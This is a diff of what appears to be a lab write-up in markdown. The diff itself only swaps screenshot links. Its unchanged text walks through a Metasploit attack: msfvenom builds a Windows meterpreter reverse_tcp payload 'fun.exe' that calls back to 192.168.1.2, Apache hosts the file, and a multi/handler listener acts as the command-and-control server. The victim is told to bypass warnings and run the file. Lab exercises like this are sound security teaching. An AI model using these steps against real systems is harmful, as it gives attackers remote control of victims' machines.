@@ -60,15 +60,15 @@ msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
 Find the attackers ip address using ifconfig
 
 ### Output:
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_11" src="https://github.com/user-attachments/assets/85c0e8b6-f33e-4bda-8167-db332a162ba3" />
 
 
+<img width="906" height="524" alt="image" src="https://github.com/user-attachments/assets/37bd34e9-d78a-48af-8e21-88ba03a7ccf7" />
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
+<img width="903" height="353" alt="image" src="https://github.com/user-attachments/assets/37e861b9-2f60-4705-858b-a34415c0978e" />
 
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_35" src="https://github.com/user-attachments/assets/be515fa0-cc19-48d7-a2c1-34a22accb9e1" />
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
@@ -80,16 +80,18 @@ Start apache server ```sudo systemctl apache2 start```
 
 
 Check the status of apache2 ```sudo apache2 status```
-
+<img width="563" height="708" alt="image" src="https://github.com/user-attachments/assets/fc28846a-940d-482e-afda-cb1fc2987805" />
 
 Invoke msfconsole:
+<img width="588" height="482" alt="image" src="https://github.com/user-attachments/assets/6e0d9018-cf50-4370-b561-74c9b40d18ae" />
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
 
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_45_52" src="https://github.com/user-attachments/assets/62a943a5-7812-4713-aa64-af2c1b122566" />
+
+<img width="812" height="510" alt="image" src="https://github.com/user-attachments/assets/d481703f-382a-413a-b279-113de8c612a5" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
@@ -99,7 +101,6 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
 
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_01" src="https://github.com/user-attachments/assets/3cd0bceb-a958-45d8-91ce-cb51238c1b06" />
 
 
 
